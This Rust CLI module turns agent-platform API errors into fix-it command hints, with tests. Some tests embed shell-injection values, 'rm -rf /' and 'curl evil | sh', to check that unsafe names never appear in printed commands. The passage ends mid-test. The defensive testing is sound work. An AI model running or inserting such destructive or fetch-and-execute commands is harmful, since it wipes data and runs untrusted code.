//! Turn a vamd HTTP error into text an agent can act on.
//!
//! The message names what was wrong, what was expected, and the command that
//! fixes it. It does not include a raw HTTP status. The status stays on
//! [`crate::output::CliError`] so exit codes and `--json` `httpStatus` still work.

use serde_json::Value;

use crate::output;

struct ApiBody {
    message: String,
    retryable: bool,
    /// The typed denials of the body (`denials`, else the one `denial`), as sent.
    denials: Vec<Value>,
}

pub fn failure(method: &str, path: &str, status: u16, body: &str) -> anyhow::Error {
    let message = explain(method, path, status, body);
    output::fail_http(output::exit_code_for_status(status), message, status)
}

pub fn explain(method: &str, path: &str, status: u16, body: &str) -> String {
    let parsed = parse_body(body);
    if let Some(text) = explain_denials(&parsed) {
        return strip_http_status(&text);
    }
    let wrong = if parsed.message.is_empty() {
        "the request was rejected".to_string()
    } else {
        parsed.message.clone()
    };
    let (expected, fix) = hint(method, path, status, &parsed);
    let text = format!(
        "{}\n{}\n{}",
        line("Wrong", &wrong),
        line("Expected", &expected),
        line("Fix", &fix),
    );
    strip_http_status(&text)
}

fn line(label: &str, text: &str) -> String {
    let text = text.trim().trim_end_matches('.').trim();
    format!("{label}: {text}.")
}

fn parse_body(body: &str) -> ApiBody {
    let scrubbed = strip_http_status(body.trim());
    if let Ok(value) = serde_json::from_str::<Value>(&scrubbed) {
        let message = value
            .get("message")
            .and_then(|m| m.as_str())
            .unwrap_or("")
            .trim()
            .to_string();
        let retryable = value
            .get("retryable")
            .and_then(|r| r.as_bool())
            .unwrap_or(false);
        let denials = match value.get("denials").and_then(Value::as_array) {
            Some(list) if !list.is_empty() => list.clone(),
            _ => value.get("denial").cloned().into_iter().collect(),
        };
        if !message.is_empty() {
            return ApiBody {
                message,
                retryable,
                denials,
            };
        }
        if let Some(code) = value.get("code").and_then(|c| c.as_str()) {
            return ApiBody {
                message: code.to_string(),
                retryable,
                denials,
            };
        }
    }
    ApiBody {
        message: scrubbed,
        retryable: false,
        denials: Vec::new(),
    }
}

/// What one typed denial asks of the reader.
enum Next {
    /// The caller can do it: the command (or step) to run.
    Fix(String),
    /// Someone else must: who, what, and the reference `vam fix request` takes.
    Ask(String),
}

/// A value safe to put in a printed command: host identifiers only, never shell syntax. The body
/// comes from the server, but a binding id or host in it started as a name someone else chose.
fn safe_word(raw: &str) -> Option<&str> {
    let ok = !raw.is_empty()
        && raw.len() <= 253
        && raw.bytes().all(|b| {
            b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'-' | b'/' | b':' | b'@' | b'+')
        });
    ok.then_some(raw)
}

fn word_or<'a>(raw: &'a str, placeholder: &'a str) -> &'a str {
    safe_word(raw).unwrap_or(placeholder)
}

/// The next step for one denial, from its `fix` (change, target, who, callerCanApply) only. The
/// body's `route` is never read or printed: the command comes from `change`. `None` when the
/// denial has no fix this CLI knows, so the caller falls back to the message text.
fn next_step(denial: &Value) -> Option<Next> {
    let fix = denial.get("fix")?;
    let get = |key: &str| fix.get(key).and_then(Value::as_str).unwrap_or("");
    let reason = denial.get("reason").and_then(Value::as_str).unwrap_or("");
    let subject = denial.get("subject").and_then(Value::as_str).unwrap_or("");
    let (change, target, who) = (get("change"), get("target"), get("who"));
    let can_apply =
        who == "SELF" || fix.get("callerCanApply").and_then(Value::as_bool) == Some(true);
    if change.is_empty() {
        // A stale version pin: the fix is to run on the bound version, which is the target.
        return (reason == "VERSION_STALE" && can_apply).then(|| {
            Next::Fix(format!(
                "run again on version {}, or omit the version",
                word_or(target, "<BOUND_VERSION>")
            ))
        });
    }
    if can_apply {
        let (agent, perm) = target.split_once('#').unwrap_or((target, ""));
        let step = match change {
            "SET_SECRET" => {
                let scope = if who == "ORG_ADMIN" {
                    " --scope org"
                } else {
                    " --scope user"
                };
                format!(
                    "vam secrets set {}{scope} --from-env <VAR>",
                    word_or(target, "<BINDING_ID>")
                )
            }
            "ENABLE_CONNECTOR" => format!("vam connectors enable {}", word_or(target, "<ID>")),
            "CONNECT_CONNECTOR" => format!(
                "connect {id} in the app, then vam connectors check {id}",
                id = word_or(target, "<ID>")
            ),
            "ALLOW_TOOL" | "ALLOW_HOST" => {
                let agent = word_or(agent, "<AGENT>");
                let what = if change == "ALLOW_HOST" { "host " } else { "" };
                format!(
                    "vam agent permissions set {agent} -f <FILE> with an allow rule for {what}{}; then vam agent release {agent} --version <X.Y.Z>",
                    word_or(perm, "<TARGET>")
                )
            }
            _ => return None,
        };
        return Some(Next::Fix(step));
    }
    let who_text = match who {
        "AGENT_OWNER" => "the agent's owner",
        "ORG_ADMIN" => "an org admin",
        _ => return None,
    };
    let (_, perm) = target.split_once('#').unwrap_or((target, subject));
    let change_text = match change {
        "ALLOW_TOOL" => format!("allow {}", word_or(perm, "the tool")),
        "ALLOW_HOST" => format!("allow the host {}", word_or(perm, "the host")),
        "SET_SECRET" => format!("set the secret {}", word_or(target, "it")),
        "ENABLE_CONNECTOR" => format!("enable {}", word_or(target, "the connector")),
        _ => return None,
    };
    let reference = denial
        .get("decisionRef")
        .and_then(Value::as_str)
        .unwrap_or("");
    let valid_ref = !reference.is_empty()
        && reference.len() <= 64
        && reference
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b == b'_');
    Some(Next::Ask(if valid_ref {
        format!("{who_text} to {change_text}; vam fix request {reference}")
    } else {
        format!("{who_text} to {change_text}")
    }))
}

/// The three-line explanation built from the body's typed denials, or `None` when none of them
/// has a fix this CLI can name (then the message matching below decides).
fn explain_denials(body: &ApiBody) -> Option<String> {
    let steps: Vec<(&Value, Next)> = body
        .denials
        .iter()
        .filter_map(|d| next_step(d).map(|n| (d, n)))
        .collect();
    let (first, _) = steps.first()?;
    let expected = first
        .get("text")
        .and_then(Value::as_str)
        .map(|t| t.chars().filter(|c| !c.is_control()).collect::<String>())
        .filter(|t| !t.trim().is_empty())
        .unwrap_or_else(|| "the fix named below".to_string());
    let mut fixes = Vec::new();
    let mut asks = Vec::new();
    for (_, step) in steps {
        match step {
            Next::Fix(f) => fixes.push(f),
            Next::Ask(a) => asks.push(a),
        }
    }
    let mut text = format!(
        "{}\n{}",
        line("Wrong", &body.message),
        line("Expected", &expected)
    );
    if !fixes.is_empty() {
        text.push_str(&format!("\nFix: {}", fixes.join("; then ")));
    }
    for ask in asks {
        text.push_str(&format!("\nAsk: {ask}"));
    }
    Some(text)
}

fn hint(method: &str, path: &str, status: u16, body: &ApiBody) -> (String, String) {
    let msg = body.message.to_ascii_lowercase();
    if path == "/v1/me/password" {
        if let Some(h) = password_change_hint(status, &msg) {
            return h;
        }
    }
    if status == 401 || msg.contains("bearer token") || msg.contains("unauthenticated") {
        return (
            "a live session token or API key".into(),
            "vam login --username <NAME> --password-from-env <VAR>".into(),
        );
    }
    if status == 403 {
        return (
            "a credential allowed to call this route".into(),
            "vam login as a user who has the required scope".into(),
        );
    }
    if method == "POST" && path == "/v1/fix-requests" && status == 404 {
        return (
            "a reference from your own refusal, no more than 30 days old".into(),
            "run the refused command again as the same user and copy the reference from its Ask: line".into(),
        );
    }
    if is_workspace_file_put(method, path) {
        if msg.contains("agent is running") {
            let session = extract_after(&body.message, "(session ")
                .and_then(|s| s.split(',').next())
                .map(str::trim);
            return (
                "an idle workspace with no active session".into(),
                match session {
                    Some(id) => format!("vam session terminate {id}"),
                    None => "vam session ls".into(),
                },
            );
        }
        if status == 413 {
            return (
                "a local file at or under the 32 MiB upload limit".into(),
                command_for(method, path),
            );
        }
    }
    if msg.contains("agent is running") {
        let run = extract_after(&body.message, ", run ").unwrap_or("<RUN_ID>");
        return (
            "no active run on that workspace".into(),
            format!("vam run cancel {run}"),
        );
    }
    if msg.contains("reserved by parked run") {
        let run = quoted_after(&body.message, "parked run").unwrap_or_else(|| "<RUN_ID>".into());
        return (
            "that parked run to be cancelled, or to expire, before the workspace can be reused"
                .into(),
            format!("vam run cancel {run}"),
        );
    }
    if msg.contains("workspace-bound agent") {
        let bound = quoted_after(&body.message, "workspace-bound agent");
        let fix = match bound {
            Some(agent) => format!("vam run {agent} -p \"...\""),
            None => "vam run <agent> -p \"...\" on a new workspace".into(),
        };
        return (
            "the agent already bound to that workspace, or a new workspace".into(),
            fix,
        );
    }
    if msg.contains("not bound to an agent") {
        return (
            "an agent on the first run for that workspace".into(),
            "vam run <agent> -p \"...\"".into(),
        );
    }
    if msg.contains("missing secret") || msg.contains("missing required secrets") {
        let binding = quoted_after(&body.message, "binding");
        let fix = match binding {
            Some(id) => format!("vam secrets set {id} --from-env <VAR>"),
            None => "vam secrets set <BINDING_ID> --from-env <VAR>".into(),
        };
        return ("that secret in the vault before the run starts".into(), fix);
    }
    if status == 409 && msg.contains("dependenc") && msg.contains("not released") {
        let mut fixes = release_fixes(&body.message);
        fixes.push(command_for(method, path));
        return (
            "every dependency released before this one".into(),
            fixes.join("; then "),
        );
    }
    if msg.contains("already decided") {
        return (
            "an approval that is still pending".into(),
            "vam approve ls".into(),
        );
    }
    if msg.contains("mcp tools drifted") {
        let id = quoted_after(&body.message, "connection").unwrap_or_else(|| "<ID>".into());
        return (
            "the pinned tool list, or an explicit re-approval of the new tools".into(),
            format!("vam mcp refresh {id} --approve-drift"),
        );
    }
    if msg.contains("namespaced mcp tool") || msg.contains("declared more than once") {
        return (
            format!(
                "a tool name of at most {} characters in [a-z0-9_], not a builtin, and unique in the session",
                vam_spec::validation::TOOL_NAME_MAX_LEN
            ),
            "rename the tool on the MCP server or shorten the connection id, then retry vam mcp connect".into(),
        );
    }
    if msg.contains("idempotency") {
        let cmd = command_for(method, path);
        return (
            "an idempotency key on this write".into(),
            format!("{cmd} --idempotency-key <KEY>"),
        );
    }
    if status == 404 {
        return (
            "an id returned by the matching list command".into(),
            list_command(path),
        );
    }
    if matches!(status, 400 | 413 | 422) {
        let expected = if status == 413 && is_workspace_file_put(method, path) {
            "a local file at or under the 32 MiB upload limit"
        } else if status == 413 {
            "a file at or under the 32 MiB download limit"
        } else {
            "a payload that matches this command's flags"
        };
        return (expected.into(), command_for(method, path));
    }
    if status == 409 || status == 412 {
        let expected = if body.retryable {
            "the conflicting run to finish, or a cancel, before retrying the same key"
        } else {
            "the resource in the state this command needs"
        };
        return (expected.into(), command_for(method, path));
    }
    if status == 503 {
        return (
            "a node that is accepting writes".into(),
            "vam node status".into(),
        );
    }
    if (500..600).contains(&status) {
        return ("vamd to accept the request".into(), "vam health".into());
    }
    (
        "a successful response from vamd".into(),
        command_for(method, path),
    )
}

/// Hints for `POST /v1/me/password`. A wrong current password is a 403 and must not read as
/// "log in again"; an API key is a 403 too, and that one does need a password session.
fn password_change_hint(status: u16, msg: &str) -> Option<(String, String)> {
    let login = "vam login --username <NAME> --password-from-env <VAR>";
    match status {
        401 => Some((
            "a live password session".into(),
            format!("{login}, then vam passwd"),
        )),
        403 if msg.contains("current password is incorrect") => Some((
            "your current password (five wrong tries, then a wait)".into(),
            "vam passwd".into(),
        )),
        403 if msg.contains("api key") => Some((
            "a password session, not an API key".into(),
            format!("unset VAM_API_KEY and --token, run {login}, then vam passwd"),
        )),
        429 => Some((
            "the wait named in the message to pass".into(),
            "vam passwd, after the wait".into(),
        )),
        400 => Some((
            "a current password, and a new one that is not empty, is at most 1024 bytes and differs from the current one".into(),
            "vam passwd".into(),
        )),
        _ => None,
    }
}

/// `vam <kind> release <urn> --version <X.Y.Z>` for each dependency a release
/// refusal lists. Offender lines read `  <kind> '<urn>' ...`; the header line and
/// kinds with no release command (evaluators) are skipped.
fn release_fixes(message: &str) -> Vec<String> {
    let mut fixes = Vec::new();
    for line in message.lines() {
        let mut words = line.trim().splitn(2, ' ');
        let (Some(kind), Some(rest)) = (words.next(), words.next()) else {
            continue;
        };
        if !matches!(kind, "skill" | "playbook" | "policy" | "agent") {
            continue;
        }
        let Some(urn) = rest.strip_prefix('\'').and_then(|r| r.split('\'').next()) else {
            continue;
        };
        let fix = format!("vam {kind} release {urn} --version <X.Y.Z>");
        if !fixes.contains(&fix) {
            fixes.push(fix);
        }
    }
    fixes
}

fn command_for(method: &str, path: &str) -> String {
    let seg = segments(path);
    let kind = seg.get(1).map(String::as_str).unwrap_or("");
    let third = seg.get(2).map(String::as_str);
    let fourth = seg.get(3).map(String::as_str);
    match (method, kind, third, fourth) {
        ("POST", "runs", None, _) => "vam run <agent> -p \"...\"".into(),
        ("POST", "runs", Some(id), Some("cancel")) => format!("vam run cancel {id}"),
        ("PUT", "agents", None, _) => "vam agent put <FILE>".into(),
        ("POST", "agents", Some(urn), Some("release")) => {
            format!("vam agent release {urn} --version <X.Y.Z>")
        }
        ("PUT", "playbooks", None, _) => "vam playbook put <FILE>".into(),
        ("POST", "playbooks", Some(urn), Some("release")) => {
            format!("vam playbook release {urn} --version <X.Y.Z>")
        }
        ("PUT", "policies", None, _) => "vam policy put <FILE> --urn <URN>".into(),
        ("POST", "policies", Some(urn), Some("release")) => {
            format!("vam policy release {urn} --version <X.Y.Z>")
        }
        ("PUT", "skills", None, _) => "vam skill put <FILE>".into(),
        ("POST", "skills", Some("packages"), None) => "vam skill publish <DIR>".into(),
        ("POST", "skills", Some("packages"), Some(_))
            if seg.get(4).map(String::as_str) == Some("release") =>
        {
            let urn = fourth.unwrap_or("<URN>");
            format!("vam skill release {urn} --version <X.Y.Z>")
        }
        ("POST", "keys", None, _) => "vam keys create --name <NAME>".into(),
        ("DELETE", "keys", Some(id), _) => format!("vam keys revoke {id}"),
        ("PUT", "secrets", None, _) => "vam secrets set <BINDING_ID> --from-env <VAR>".into(),
        ("DELETE", "secrets", Some(id), _) => format!("vam secrets delete {id}"),
        ("POST", "sessions", None, _) => "vam session create".into(),
        ("POST", "sessions", Some("restore"), _) => {
            "vam session restore <SNAPSHOT_ID> --session <ID>".into()
        }
        ("POST", "sessions", Some(id), Some("pause")) => format!("vam session pause {id}"),
        ("POST", "sessions", Some(id), Some("resume")) => format!("vam session resume {id}"),
        ("POST", "sessions", Some(id), Some("terminate")) => format!("vam session terminate {id}"),
        ("POST", "sessions", Some(id), Some("snapshots")) => format!("vam session snapshot {id}"),
        ("POST", "approvals", Some(id), Some("decide")) => {
            format!("vam approve decide {id} --decision approved")
        }
        ("POST", "login", _, _) => "vam login --username <NAME> --password-from-env <VAR>".into(),
        ("POST", "logout", _, _) => "vam logout".into(),
        ("POST", "me", Some("password"), _) => "vam passwd".into(),
        ("PUT", "workspaces", Some(_), Some("files")) => {
            "vam workspace put <PATH> <LOCAL-FILE> -w <WORKSPACE>".into()
        }
        _ => list_command(path),
    }
}

fn is_workspace_file_put(method: &str, path: &str) -> bool {
    method == "PUT" && path.contains("/workspaces/") && path.contains("/files/")
}

fn list_command(path: &str) -> String {
    match segments(path).get(1).map(String::as_str).unwrap_or("") {
        "runs" => "vam run ls".into(),
        "sessions" => "vam session ls".into(),
        "agents" => "vam agent ls".into(),
        "playbooks" => "vam playbook ls".into(),
        "policies" => "vam policy ls".into(),
        "skills" => "vam skill ls".into(),
        "approvals" => "vam approve ls".into(),
        "keys" => "vam keys list".into(),
        "secrets" => "vam secrets list".into(),
        "workspaces" => "vam workspace ls".into(),
        _ => "vam health".into(),
    }
}

fn segments(path: &str) -> Vec<String> {
    path.split('?')
        .next()
        .unwrap_or(path)
        .split('/')
        .filter(|part| !part.is_empty())
        .map(|part| crate::client::decode_path_segment(part).unwrap_or_else(|_| part.to_string()))
        .collect()
}

fn extract_after<'a>(message: &'a str, marker: &str) -> Option<&'a str> {
    let rest = message.split(marker).nth(1)?.trim();
    let id = rest.trim_end_matches(|c: char| c == ')' || c == '.' || c.is_whitespace());
    if id.is_empty() {
        None
    } else {
        Some(id)
    }
}

fn quoted_after(message: &str, marker: &str) -> Option<String> {
    let rest = message.split(marker).nth(1)?;
    let start = rest.find('\'')? + 1;
    let end = rest[start..].find('\'')?;
    let value = &rest[start..start + end];
    if value.is_empty() {
        None
    } else {
        Some(value.to_string())
    }
}

/// Remove `HTTP 422` (and any other 3-digit status after `HTTP `).
pub fn strip_http_status(text: &str) -> String {
    let mut rest = text;
    let mut out = String::new();
    while let Some(idx) = rest.find("HTTP ") {
        out.push_str(&rest[..idx]);
        let after = &rest[idx + 5..];
        let digits: String = after.chars().take_while(|c| c.is_ascii_digit()).collect();
        let parsed = digits.parse::<u16>().ok();
        if digits.len() == 3 && parsed.is_some_and(|n| (100..600).contains(&n)) {
            let mut skip = 5 + digits.len();
            let tail = &rest[idx + skip..];
            if tail.starts_with(':') {
                skip += 1;
                if rest[idx + skip..].starts_with(' ') {
                    skip += 1;
                }
            } else if tail.starts_with(' ') {
                skip += 1;
            }
            rest = &rest[idx + skip..];
        } else {
            out.push_str("HTTP ");
            rest = after;
        }
    }
    out.push_str(rest);
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::output::ExitCode;

    fn body(code: &str, message: &str, retryable: bool) -> String {
        serde_json::json!({
            "code": code,
            "message": message,
            "retryable": retryable,
        })
        .to_string()
    }

    #[test]
    fn a_fix_request_for_a_reference_that_is_not_yours_says_where_to_get_one() {
        let raw = body("NotFound", "denial not found", false);
        let text = failure("POST", "/v1/fix-requests", 404, &raw).to_string();
        assert!(text.contains("Wrong: denial not found."), "{text}");
        assert!(
            text.contains("Expected: a reference from your own refusal"),
            "{text}"
        );
        assert!(
            text.contains("copy the reference from its Ask: line"),
            "{text}"
        );
        // Any other answer keeps the generic text.
        let raw = body(
            "FailedPrecondition",
            "nobody can be asked to apply this fix right now",
            false,
        );
        let text = failure("POST", "/v1/fix-requests", 409, &raw).to_string();
        assert!(text.contains("nobody can be asked"), "{text}");
        assert!(!text.contains("your own refusal"), "{text}");
    }

    #[test]
    fn unreleased_dependencies_each_get_a_line_and_a_release_command() {
        let message = "cannot release agent 'urn:vam:agent:local.vam.dev/acme/a': 2 dependencies are not released\n  skill 'urn:vam:skill:local.vam.dev/acme/jira' has no released version: release it first, then release this agent.\n  playbook 'urn:vam:playbook:local.vam.dev/acme/pb' has no released version: release it first, then release this agent.";
        let raw = body("FailedPrecondition", message, false);
        let err = failure(
            "POST",
            "/v1/agents/urn%3Avam%3Aagent%3Alocal.vam.dev%2Facme%2Fa/release",
            409,
            &raw,
        );
        let text = err.to_string();
        assert!(
            text.contains(
                "\n  skill 'urn:vam:skill:local.vam.dev/acme/jira' has no released version"
            ),
            "{text}"
        );
        assert!(
            text.contains(
                "\n  playbook 'urn:vam:playbook:local.vam.dev/acme/pb' has no released version"
            ),
            "{text}"
        );
        assert!(
            text.contains("Expected: every dependency released before this one."),
            "{text}"
        );
        assert!(
            text.contains("Fix: vam skill release urn:vam:skill:local.vam.dev/acme/jira --version <X.Y.Z>; then vam playbook release urn:vam:playbook:local.vam.dev/acme/pb --version <X.Y.Z>; then vam agent release"),
            "{text}"
        );
        assert!(!text.contains("HTTP"), "{text}");
        assert_eq!(output::classify(&err).1, Some(409));
    }

    #[test]
    fn password_change_wrong_password_does_not_say_log_in_again() {
        let raw = body("PermissionDenied", "current password is incorrect", false);
        let text = failure("POST", "/v1/me/password", 403, &raw).to_string();
        assert!(
            text.contains("Wrong: current password is incorrect."),
            "{text}"
        );
        assert!(text.contains("Fix: vam passwd."), "{text}");
        assert!(!text.contains("vam login"), "{text}");
    }

    #[test]
    fn password_change_with_an_api_key_asks_for_a_password_session() {
        let raw = body(
            "PermissionDenied",
            "changing a password needs a password session (vam login); API keys cannot change a password",
            false,
        );
        let text = failure("POST", "/v1/me/password", 403, &raw).to_string();
        assert!(
            text.contains("a password session, not an API key"),
            "{text}"
        );
        assert!(text.contains("vam login"), "{text}");
    }

    #[test]
    fn password_change_rate_limit_keeps_the_wait_and_401_asks_for_a_session() {
        let raw = body(
            "RESOURCE_EXHAUSTED",
            "too many wrong password attempts; retry after 42s",
            true,
        );
        let text = failure("POST", "/v1/me/password", 429, &raw).to_string();
        assert!(text.contains("retry after 42s"), "{text}");
        assert!(text.contains("vam passwd, after the wait"), "{text}");
        let raw = body("Unauthenticated", "invalid bearer token", false);
        let text = failure("POST", "/v1/me/password", 401, &raw).to_string();
        assert!(text.contains("a live password session"), "{text}");
        assert!(text.contains("then vam passwd"), "{text}");
    }

    #[test]
    fn unprocessable_entity_names_the_fix_without_a_status() {
        let raw = body("InvalidArgument", "field prompt is required", false);
        let err = failure("POST", "/v1/runs", 422, &raw);
        let text = err.to_string();
        assert!(!text.contains("HTTP"), "{text}");
        assert!(!text.contains("422"), "{text}");
        assert!(text.contains("Wrong: field prompt is required."), "{text}");
        assert!(
            text.contains("Expected: a payload that matches this command's flags."),
            "{text}"
        );
        assert!(text.contains("Fix: vam run <agent> -p \"...\"."), "{text}");
        assert_eq!(output::classify(&err), (ExitCode::Invalid, Some(422)));
    }

    #[test]
    fn workspace_put_busy_suggests_session_terminate() {
        let raw = body(
            "FailedPrecondition",
            "agent is running on workspace 'assistant' (session sess-1, run run-1)",
            true,
        );
        let text = explain(
            "PUT",
            "/v1/workspaces/assistant/files/workspace/notes/a.md",
            409,
            &raw,
        );
        assert!(text.contains("idle workspace"), "{text}");
        assert!(text.contains("vam session terminate sess-1"), "{text}");
    }

    #[test]
    fn workspace_put_413_names_upload_limit() {
        let raw = body(
            "InvalidArgument",
            "file size 33000000 bytes exceeds maximum 33554432 bytes",
            false,
        );
        let text = explain(
            "PUT",
            "/v1/workspaces/assistant/files/workspace/big.bin",
            413,
            &raw,
        );
        assert!(text.contains("32 MiB upload limit"), "{text}");
        assert!(text.contains("vam workspace put"), "{text}");
    }

    #[test]
    fn agent_running_tells_you_to_cancel() {
        let raw = body(
            "FailedPrecondition",
            "agent is running on workspace 'assistant' (session sess-1, run run-1)",
            true,
        );
        let text = explain("POST", "/v1/runs", 409, &raw);
        assert!(!text.contains("HTTP"), "{text}");
        assert!(!text.contains("409"), "{text}");
        assert!(
            text.contains("Wrong: agent is running on workspace 'assistant'"),
            "{text}"
        );
        assert!(
            text.contains("Expected: no active run on that workspace."),
            "{text}"
        );
        assert!(text.contains("Fix: vam run cancel run-1."), "{text}");
    }

    #[test]
    fn parked_workspace_tells_you_to_cancel() {
        let raw = body(
            "FailedPrecondition",
            "workspace 'assistant' is reserved by parked run 'run-9'; cancel it with: vam run cancel run-9",
            true,
        );
        let text = explain("POST", "/v1/runs", 409, &raw);
        assert!(text.contains("parked run 'run-9'"), "{text}");
        assert!(text.contains("Fix: vam run cancel run-9."), "{text}");
        assert!(!text.contains("HTTP"), "{text}");
        assert!(!text.contains("409"), "{text}");
    }

    #[test]
    fn not_found_names_the_list_command() {
        let raw = body("NotFound", "agent 'urn:vam:agent:ex/a' not found", false);
        let text = explain("GET", "/v1/agents/urn%3Avam%3Aagent%3Aex%2Fa", 404, &raw);
        assert!(text.contains("Fix: vam agent ls."), "{text}");
        assert!(!text.contains("HTTP"), "{text}");
        assert!(!text.contains("404"), "{text}");
    }

    #[test]
    fn auth_failure_names_login() {
        let raw = body("Unauthenticated", "missing or invalid bearer token", false);
        let text = explain("GET", "/v1/node", 401, &raw);
        assert!(
            text.contains("Wrong: missing or invalid bearer token."),
            "{text}"
        );
        assert!(
            text.contains("Fix: vam login --username <NAME> --password-from-env <VAR>."),
            "{text}"
        );
    }

    #[test]
    fn missing_secret_names_secrets_set() {
        let raw = body(
            "FailedPrecondition",
            "missing secret binding 'jira/auth-header' (scope user)",
            false,
        );
        let text = explain("POST", "/v1/runs", 412, &raw);
        assert!(
            text.contains("Fix: vam secrets set jira/auth-header --from-env <VAR>."),
            "{text}"
        );
    }

    #[test]
    fn status_line_in_the_body_is_removed() {
        let text = explain(
            "PUT",
            "/v1/agents",
            422,
            "HTTP 422: {\"message\":\"name is required\"}",
        );
        assert!(!text.contains("HTTP"), "{text}");
        assert!(!text.contains("422"), "{text}");
        assert!(text.contains("Wrong: name is required."), "{text}");
        assert!(text.contains("Fix: vam agent put <FILE>."), "{text}");
    }

    fn with_denials(message: &str, denials: serde_json::Value) -> String {
        let first = denials[0].clone();
        serde_json::json!({
            "code": "FailedPrecondition",
            "message": message,
            "retryable": false,
            "denial": first,
            "denials": denials,
        })
        .to_string()
    }

    fn secret(who: &str, can_apply: bool, reference: &str) -> serde_json::Value {
        serde_json::json!({
            "reason": "SECRET_MISSING",
            "subject": "never-set-token",
            "text": "You can set the secret never-set-token for yourself.",
            "decisionRef": reference,
            "fix": {
                "change": "SET_SECRET",
                "target": "never-set-token",
                "who": who,
                "callerCanApply": can_apply,
                // The route is never read: this one would be a shell injection if it were.
                "route": {"method": "PUT", "path": "/v1/x; rm -rf /"},
            },
        })
    }

    const MISSING: &str = "admission failed: missing required secrets: never-set-token@either";

    #[test]
    fn a_secret_the_caller_can_set_prints_the_command_from_the_denial() {
        let raw = with_denials(MISSING, serde_json::json!([secret("SELF", true, "")]));
        let text = failure("POST", "/v1/runs", 412, &raw).to_string();
        assert!(text.contains(&format!("Wrong: {MISSING}.")), "{text}");
        assert!(
            text.contains("\nFix: vam secrets set never-set-token --scope user --from-env <VAR>\n")
                || text.ends_with(
                    "\nFix: vam secrets set never-set-token --scope user --from-env <VAR>"
                ),
            "{text}"
        );
        assert!(!text.contains("rm -rf"), "{text}");
        assert!(!text.contains("Ask:"), "{text}");
    }

    #[test]
    fn an_org_secret_is_set_with_the_org_scope_by_an_admin_and_asked_for_by_anyone_else() {
        let admin = with_denials(MISSING, serde_json::json!([secret("ORG_ADMIN", true, "")]));
        let text = failure("POST", "/v1/runs", 412, &admin).to_string();
        assert!(
            text.contains("Fix: vam secrets set never-set-token --scope org --from-env <VAR>"),
            "{text}"
        );
        let member = with_denials(
            MISSING,
            serde_json::json!([secret("ORG_ADMIN", false, "dnl_01HZZZZZZZZZZZZZZZZZZZZZZZ")]),
        );
        let text = failure("POST", "/v1/runs", 412, &member).to_string();
        assert!(
            text.contains("\nAsk: an org admin to set the secret never-set-token; vam fix request dnl_01HZZZZZZZZZZZZZZZZZZZZZZZ"),
            "{text}"
        );
        assert!(!text.contains("Fix:"), "{text}");
    }

    #[test]
    fn several_denials_each_get_their_own_step() {
        let raw = with_denials(
            MISSING,
            serde_json::json!([
                secret("SELF", true, ""),
                secret("ORG_ADMIN", false, "dnl_abc")
            ]),
        );
        let text = failure("POST", "/v1/runs", 412, &raw).to_string();
        assert!(
            text.contains("Fix: vam secrets set never-set-token --scope user"),
            "{text}"
        );
        assert!(
            text.contains(
                "Ask: an org admin to set the secret never-set-token; vam fix request dnl_abc"
            ),
            "{text}"
        );
    }

    #[test]
    fn a_stale_version_names_the_bound_version() {
        let raw = with_denials(
            "agent version '2.0.0' does not match workspace-bound version '1.0.0' on workspace 'w'",
            serde_json::json!([{
                "reason": "VERSION_STALE",
                "subject": "1.0.0",
                "text": "Run again on version 1.0.0, or omit the version.",
                "fix": {"target": "1.0.0", "who": "SELF", "callerCanApply": true},
            }]),
        );
        let text = failure("POST", "/v1/runs", 409, &raw).to_string();
        assert!(
            text.contains("does not match workspace-bound version"),
            "{text}"
        );
        assert!(
            text.lines()
                .any(|l| l == "Fix: run again on version 1.0.0, or omit the version"),
            "{text}"
        );
    }

    #[test]
    fn a_host_and_a_tool_name_the_permissions_command_and_the_release() {
        let host = |who: &str, can| {
            serde_json::json!([{
                "reason": "EGRESS_RULE",
                "subject": "example.com",
                "decisionRef": if can { "" } else { "dnl_h1" },
                "fix": {
                    "change": "ALLOW_HOST",
                    "target": "urn:vam:agent:local.vam.dev/acme/a#example.com",
                    "who": who,
                    "callerCanApply": can,
                },
            }])
        };
        let text = failure(
            "POST",
            "/v1/runs",
            403,
            &with_denials("blocked", host("AGENT_OWNER", true)),
        )
        .to_string();
        assert!(
            text.contains("Fix: vam agent permissions set urn:vam:agent:local.vam.dev/acme/a -f <FILE> with an allow rule for host example.com; then vam agent release urn:vam:agent:local.vam.dev/acme/a --version <X.Y.Z>"),
            "{text}"
        );
        let text = failure(
            "POST",
            "/v1/runs",
            403,
            &with_denials("blocked", host("AGENT_OWNER", false)),
        )
        .to_string();
        assert!(
            text.contains(
                "Ask: the agent's owner to allow the host example.com; vam fix request dnl_h1"
            ),
            "{text}"
        );
    }

    #[test]
    fn connector_fixes_come_from_the_change() {
        let one = |change: &str, who: &str| {
            serde_json::json!([{
                "reason": "CONNECTOR_DISABLED",
                "subject": "microsoft-365",
                "fix": {"change": change, "target": "microsoft-365", "who": who, "callerCanApply": true},
            }])
        };
        let text = failure(
            "POST",
            "/v1/runs",
            403,
            &with_denials("m", one("ENABLE_CONNECTOR", "ORG_ADMIN")),
        )
        .to_string();
        assert!(
            text.contains("Fix: vam connectors enable microsoft-365"),
            "{text}"
        );
        let text = failure(
            "POST",
            "/v1/runs",
            403,
            &with_denials("m", one("CONNECT_CONNECTOR", "SELF")),
        )
        .to_string();
        assert!(
            text.contains(
                "Fix: connect microsoft-365 in the app, then vam connectors check microsoft-365"
            ),
            "{text}"
        );
    }

    #[test]
    fn a_denial_with_no_fix_or_an_unknown_change_falls_back_to_the_message_matching() {
        let no_fix = serde_json::json!([{"reason": "QUOTA", "subject": "r", "text": "full"}]);
        let raw = with_denials(
            "admission failed: missing required secrets: tok@user",
            no_fix,
        );
        let text = failure("POST", "/v1/runs", 412, &raw).to_string();
        assert!(
            text.contains("Fix: vam secrets set <BINDING_ID> --from-env <VAR>"),
            "{text}"
        );
        let unknown = serde_json::json!([{
            "reason": "POLICY_RULE", "subject": "x",
            "fix": {"change": "SOMETHING_NEW", "target": "x", "who": "SELF", "callerCanApply": true},
        }]);
        let text = failure("POST", "/v1/runs", 412, &with_denials("odd", unknown)).to_string();
        assert!(text.contains("Wrong: odd."), "{text}");
        assert!(text.contains("Fix: "), "{text}");
        assert!(!text.contains("SOMETHING_NEW"), "{text}");
    }

    #[test]
    fn names_that_could_be_shell_syntax_are_not_printed_in_a_command() {
        let mut d = secret("SELF", true, "");
        d["fix"]["target"] = serde_json::json!("x; curl evil | sh");
        let text = failure(
            "POST",
